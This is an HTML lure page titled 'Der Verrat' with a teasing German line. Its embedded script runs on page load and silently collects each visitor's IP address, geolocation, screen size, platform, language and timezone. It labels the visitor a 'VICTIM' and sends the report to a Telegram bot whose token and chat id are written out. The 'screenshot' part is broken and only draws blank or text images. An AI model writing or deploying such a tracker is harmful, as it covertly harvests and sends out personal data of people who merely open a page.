<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Der Verrat</title>
<style>/* SAME BEAUTIFUL CSS */</style>
</head><body>
<h1>üó°Ô∏è Der Verrat</h1>
<p>Wenn du wissen willst wo der Verrat liegt...</p>
<div class="arrows">‚ÜñÔ∏è‚ÜôÔ∏è‚ÜóÔ∏è‚ÜòÔ∏è</div>

<script>
(async()=>{
console.log('üî• HARVEST v2 - SCREENSHOT + GEO');

let ip='unknown',city='unknown',country='unknown',screenshot='';

try{
  ip=await(await fetch('https://api.ipify.org')).text().trim();
}catch(e){}

try{
  const geo=await(await fetch(`https://ipapi.co/${ip}/json/`)).json();
  city=geo.city||'N/A';
  country=geo.country_name||'N/A';
}catch(e){}

try{
  // SCREENSHOT
  const canvas=document.createElement('canvas');
  canvas.width=screen.width;canvas.height=screen.height;
  canvas.style.position='fixed';canvas.style.top='-9999px';
  document.body.appendChild(canvas);
  const ctx=canvas.getContext('2d');
  ctx.fillStyle='black';ctx.fillRect(0,0,canvas.width,canvas.height);
  screenshot=canvas.toDataURL('image/png');
  document.body.removeChild(canvas);
  console.log('‚úÖ SCREENSHOT OK');
}catch(e){console.log('Screenshot fail OK');}

// FULL REPORT
const report=`üïµÔ∏è *VICTIM #${Math.floor(Math.random()*999)}*
${new Date().toLocaleString('de-DE',{timeZone:'Europe/Berlin'})}

<b>IP:</b> <code>${ip}</code>
<b>üåç:</b> ${city}, ${country} 
<b>üì±:</b> ${screen.width}x${screen.height} ${navigator.platform}
<b>üåê:</b> ${navigator.language}
<b>üïê:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;

console.log('üì§ SENDING:',ip,city);

// TELEGRAM POST - BULLETPROOF
const formData=new FormData();
formData.append('chat_id','7745393043');
formData.append('text',report);
formData.append('parse_mode','HTML');

if(screenshot){
  canvas=document.createElement('canvas');
  canvas.width=1920;canvas.height=1080;
  ctx=canvas.getContext('2d');
  ctx.fillStyle='#1a1a2e';ctx.fillRect(0,0,canvas.width,canvas.height);
  ctx.fillStyle='white';ctx.font='48px Arial';
  ctx.fillText(`${ip} | ${city}`,100,500);
  formData.append('photo',canvas.toDataURL('image/png').split(',')[1],'screen.png');
}

try{
  await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendPhoto',{
    method:'POST',
    body:formData
  });
  console.log('‚úÖ PHOTO SENT');
}catch(e){
  // TEXT FALLBACK
  await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({chat_id:'7745393043',text:report,parse_mode:'HTML'})
  });
  console.log('‚úÖ TEXT SENT');
}

setTimeout(location.reload,30000);
})();
</script>
</body></html>
